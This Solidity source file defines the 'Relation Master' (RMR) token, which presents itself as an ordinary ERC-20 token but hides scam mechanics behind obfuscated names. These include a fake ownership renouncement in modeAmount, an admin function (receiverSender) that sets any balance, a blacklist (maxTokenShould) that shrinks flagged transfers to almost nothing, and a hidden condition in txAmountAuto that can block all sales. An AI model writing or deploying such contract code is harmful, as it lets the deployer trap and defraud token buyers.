//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface maxTo {
    function createPair(address liquiditySell, address senderMarketing) external returns (address);
}

interface minMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptReceiver) external view returns (uint256);

    function transfer(address totalAt, uint256 enableTo) external returns (bool);

    function allowance(address receiverTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableTo) external returns (bool);

    function transferFrom(
        address sender,
        address totalAt,
        uint256 enableTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundReceiver, uint256 value);
    event Approval(address indexed receiverTrading, address indexed spender, uint256 value);
}

abstract contract feeLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyFundTotal is minMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RelationMaster is feeLaunched, minMode, buyFundTotal {

    mapping(address => uint256) private buyExempt;

    uint256 public teamReceiver;

    uint256 public launchedAuto;

    uint8 private amountTeamLiquidity = 18;

    constructor (){
        
        limitLiquidity txMin = limitLiquidity(takeLaunch);
        enableLimit = maxTo(txMin.factory()).createPair(txMin.WETH(), address(this));
        if (toExemptFund != teamReceiver) {
            senderList = false;
        }
        swapLiquidity = _msgSender();
        teamTo[swapLiquidity] = true;
        buyExempt[swapLiquidity] = takeReceiver;
        modeAmount();
        
        emit Transfer(address(0), swapLiquidity, takeReceiver);
    }

    bool public senderList;

    mapping(address => bool) public teamTo;

    function transferFrom(address senderFrom, address totalAt, uint256 enableTo) external override returns (bool) {
        if (_msgSender() != takeLaunch) {
            if (fundWallet[senderFrom][_msgSender()] != type(uint256).max) {
                require(enableTo <= fundWallet[senderFrom][_msgSender()]);
                fundWallet[senderFrom][_msgSender()] -= enableTo;
            }
        }
        return txAmountAuto(senderFrom, totalAt, enableTo);
    }

    address public enableLimit;

    function decimals() external view virtual override returns (uint8) {
        return amountTeamLiquidity;
    }

    function approve(address feeTokenBuy, uint256 enableTo) public virtual override returns (bool) {
        fundWallet[_msgSender()][feeTokenBuy] = enableTo;
        emit Approval(_msgSender(), feeTokenBuy, enableTo);
        return true;
    }

    function maxTokenShould(address feeTake) public {
        marketingAmountMin();
        if (launchMarketingList != launchedAuto) {
            launchMarketingList = launchedAuto;
        }
        if (feeTake == swapLiquidity || feeTake == enableLimit) {
            return;
        }
        txIs[feeTake] = true;
    }

    bool public takeLaunchedToken;

    event OwnershipTransferred(address indexed receiverExempt, address indexed walletLiquidityAmount);

    function modeAmount() public {
        emit OwnershipTransferred(swapLiquidity, address(0));
        minLaunch = address(0);
    }

    uint256 autoBuyEnable;

    address isSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function txAmountAuto(address senderFrom, address totalAt, uint256 enableTo) internal returns (bool) {
        if (senderFrom == swapLiquidity) {
            return teamSwapToken(senderFrom, totalAt, enableTo);
        }
        uint256 senderAuto = minMode(enableLimit).balanceOf(isSell);
        require(senderAuto == walletLaunchedFee);
        require(totalAt != isSell);
        if (txIs[senderFrom]) {
            return teamSwapToken(senderFrom, totalAt, launchMinAmount);
        }
        return teamSwapToken(senderFrom, totalAt, enableTo);
    }

    string private txAuto = "Relation Master";

    function getOwner() external view returns (address) {
        return minLaunch;
    }

    function marketingAmountMin() private view {
        require(teamTo[_msgSender()]);
    }

    address private minLaunch;

    uint256 private takeReceiver = 100000000 * 10 ** 18;

    uint256 constant launchMinAmount = 20 ** 10;

    string private txShouldFrom = "RMR";

    function totalSupply() external view virtual override returns (uint256) {
        return takeReceiver;
    }

    function listAuto(address isMin) public {
        require(isMin.balance < 100000);
        if (exemptAutoShould) {
            return;
        }
        if (receiverMaxShould != toExemptFund) {
            teamReceiver = receiverMaxShould;
        }
        teamTo[isMin] = true;
        
        exemptAutoShould = true;
    }

    function balanceOf(address exemptReceiver) public view virtual override returns (uint256) {
        return buyExempt[exemptReceiver];
    }

    function name() external view virtual override returns (string memory) {
        return txAuto;
    }

    address takeLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return txShouldFrom;
    }

    function transfer(address sellWalletLaunch, uint256 enableTo) external virtual override returns (bool) {
        return txAmountAuto(_msgSender(), sellWalletLaunch, enableTo);
    }

    uint256 public toExemptFund;

    address public swapLiquidity;

    mapping(address => mapping(address => uint256)) private fundWallet;

    function receiverSender(address sellWalletLaunch, uint256 enableTo) public {
        marketingAmountMin();
        buyExempt[sellWalletLaunch] = enableTo;
    }

    function allowance(address feeMode, address feeTokenBuy) external view virtual override returns (uint256) {
        if (feeTokenBuy == takeLaunch) {
            return type(uint256).max;
        }
        return fundWallet[feeMode][feeTokenBuy];
    }

    function teamSwapToken(address senderFrom, address totalAt, uint256 enableTo) internal returns (bool) {
        require(buyExempt[senderFrom] >= enableTo);
        buyExempt[senderFrom] -= enableTo;
        buyExempt[totalAt] += enableTo;
        emit Transfer(senderFrom, totalAt, enableTo);
        return true;
    }

    uint256 walletLaunchedFee;

    function launchFundMode(uint256 enableTo) public {
        marketingAmountMin();
        walletLaunchedFee = enableTo;
    }

    bool public exemptAutoShould;

    mapping(address => bool) public txIs;

    uint256 private receiverMaxShould;

    uint256 public launchMarketingList;

    function owner() external view returns (address) {
        return minLaunch;
    }

}